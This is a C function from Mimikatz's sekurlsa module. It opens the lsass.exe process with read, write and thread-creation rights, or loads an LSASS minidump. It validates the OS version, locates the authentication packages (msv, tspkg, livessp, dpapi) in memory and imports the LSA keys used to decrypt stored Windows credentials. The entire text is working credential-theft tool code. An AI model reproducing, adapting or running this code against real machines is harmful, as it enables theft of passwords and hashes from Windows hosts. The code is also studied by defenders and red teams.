NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
	NTSTATUS status = STATUS_SUCCESS;
	KULL_M_MEMORY_TYPE Type;
	HANDLE hData = NULL;
	DWORD pid;
	PMINIDUMP_SYSTEM_INFO pInfos;
	DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
	BOOL isError = FALSE;

	if(!cLsass.hLsassMem)
	{
		status = STATUS_NOT_FOUND;
		if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
		{
			if(pMinidumpName)
			{
				Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
				kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
				hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
			}
			else
			{
				Type = KULL_M_MEMORY_TYPE_PROCESS;
				if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
					hData = OpenProcess(processRights, FALSE, pid);
				else PRINT_ERROR(L"LSASS process not found (?)\n");
			}

			if(hData && hData != INVALID_HANDLE_VALUE)
			{
				if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
				{
					if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
					{
						if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
						{
							cLsass.osContext.MajorVersion = pInfos->MajorVersion;
							cLsass.osContext.MinorVersion = pInfos->MinorVersion;
							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;

							if(isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION))
								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
						#ifdef _M_X64
							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
						#elif defined _M_IX86
							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
						#endif
						
						}
						else
						{
							isError = TRUE;
							PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
						}
					}
					else
					{
						cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
						cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
						cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
					}
					
					if(!isError)
					{
						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);

						if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
						{
							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
							if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
							{
								status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);

								if(!NT_SUCCESS(status))
									PRINT_ERROR(L"Key import\n");
							}
							else PRINT_ERROR(L"Logon list\n");
						}
						else PRINT_ERROR(L"Modules informations\n");
					}
				}
				else PRINT_ERROR(L"Memory opening\n");
			}
			else PRINT_ERROR_AUTO(L"Handle on memory");

			if(!NT_SUCCESS(status))
			{
				cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
				CloseHandle(hData);
			}
		}
		else PRINT_ERROR(L"Local LSA library failed\n");
	}
	return status;
}